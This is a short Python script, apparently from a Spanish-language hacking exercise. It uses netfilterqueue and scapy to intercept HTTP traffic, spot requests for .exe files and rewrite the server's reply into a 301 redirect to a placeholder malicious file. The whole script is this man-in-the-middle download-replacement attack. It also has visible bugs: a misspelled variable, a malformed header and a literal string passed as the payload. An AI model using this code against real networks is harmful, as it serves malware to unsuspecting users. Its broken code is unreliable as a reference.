import netfilterqueue
from scapy.all import DNSRR,IP,TCP,Raw

ack_list = []

def set_load(packet,load):
	packet[Raw].load = load
	del packet[IP].len
	del packet[IP].chksum
	del acket[TCP].chksum
	return packet

def process_packet(packet):
	scapy_packet = IP(packet.get_payload())
	
	if scapy_packet.haslayer(Raw) :
		if scapy_packet[TCP].dport == 80:
			if ".exe" in scapy_packet[Raw].load:
				print("Descargando ejecutable...")
				ack_list.append(scapy_packet[TCP].ack)
				print(scapy_packet.show())
		elif scapy_packet[TCP].sport == 80:
			if scapy_packet[TCP].seq in ack_list:
				ack_list.remove(scapy_packet[TCP].seq)
				modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently/nLocation: http://un_archivo_para_descargar.virus\n\n")
				print("Reemplazando archivos")
				
				packet.set_payload(b'modified_packet')
				
				
	
	
	packet.accept()
	
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run
